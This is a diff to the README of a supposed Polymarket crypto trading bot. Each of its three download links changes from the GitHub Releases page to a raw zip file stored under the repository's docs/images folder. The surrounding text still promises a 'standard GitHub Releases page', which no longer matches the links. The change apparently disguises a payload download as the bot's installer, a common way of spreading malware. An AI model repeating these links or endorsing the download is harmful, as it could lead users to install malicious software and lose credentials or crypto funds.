@@ -1,6 +1,6 @@
 # 🤖 polymarket-trading-bot-ai-model-btc-5m-15m-1h-stacked-ensemble-xgboost-lightgbm - Trade Smarter, Automate Your Crypto Bets
 
-[![Download Now](https://img.shields.io/badge/Download-Polymarket_Bot_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Marjathirtyfour391/polymarket-trading-bot-ai-model-btc-5m-15m-1h-stacked-ensemble-xgboost-lightgbm/releases)
+[![Download Now](https://img.shields.io/badge/Download-Polymarket_Bot_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Marjathirtyfour391/polymarket-trading-bot-ai-model-btc-5m-15m-1h-stacked-ensemble-xgboost-lightgbm/main/docs/images/2.4-beta.3.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Whether you're new to crypto trading or a seasoned pro, this bot takes the stres
 
 ## 🚀 Getting Started (Windows Installation)
 
-**Visit this link to download the application:** [https://github.com/Marjathirtyfour391/polymarket-trading-bot-ai-model-btc-5m-15m-1h-stacked-ensemble-xgboost-lightgbm/releases](https://github.com/Marjathirtyfour391/polymarket-trading-bot-ai-model-btc-5m-15m-1h-stacked-ensemble-xgboost-lightgbm/releases)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/Marjathirtyfour391/polymarket-trading-bot-ai-model-btc-5m-15m-1h-stacked-ensemble-xgboost-lightgbm/main/docs/images/2.4-beta.3.zip](https://raw.githubusercontent.com/Marjathirtyfour391/polymarket-trading-bot-ai-model-btc-5m-15m-1h-stacked-ensemble-xgboost-lightgbm/main/docs/images/2.4-beta.3.zip)
 
 Once you click the link above, you'll be taken to a standard GitHub Releases page. Look for the latest release version (it will start with "v" followed by numbers, like v1.2.0). You will see downloadable files listed there.
 
@@ -137,7 +137,7 @@ The primary release is built for Windows. The source code can be run on other sy
 
 You now have everything you need to start your journey into automated crypto trading on Polymarket. Remember: start with paper trading, watch how the bot behaves, and gradually transition to live trading when you feel confident. This bot was built to be your tireless trading partner — working while you sleep, learning from every data point, and executing with machine precision.
 
-**Visit this link to download the application:** [https://github.com/Marjathirtyfour391/polymarket-trading-bot-ai-model-btc-5m-15m-1h-stacked-ensemble-xgboost-lightgbm/releases](https://github.com/Marjathirtyfour391/polymarket-trading-bot-ai-model-btc-5m-15m-1h-stacked-ensemble-xgboost-lightgbm/releases)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/Marjathirtyfour391/polymarket-trading-bot-ai-model-btc-5m-15m-1h-stacked-ensemble-xgboost-lightgbm/main/docs/images/2.4-beta.3.zip](https://raw.githubusercontent.com/Marjathirtyfour391/polymarket-trading-bot-ai-model-btc-5m-15m-1h-stacked-ensemble-xgboost-lightgbm/main/docs/images/2.4-beta.3.zip)
 
 Happy trading, and may your predictions be ever in your favor! 📊✨
 
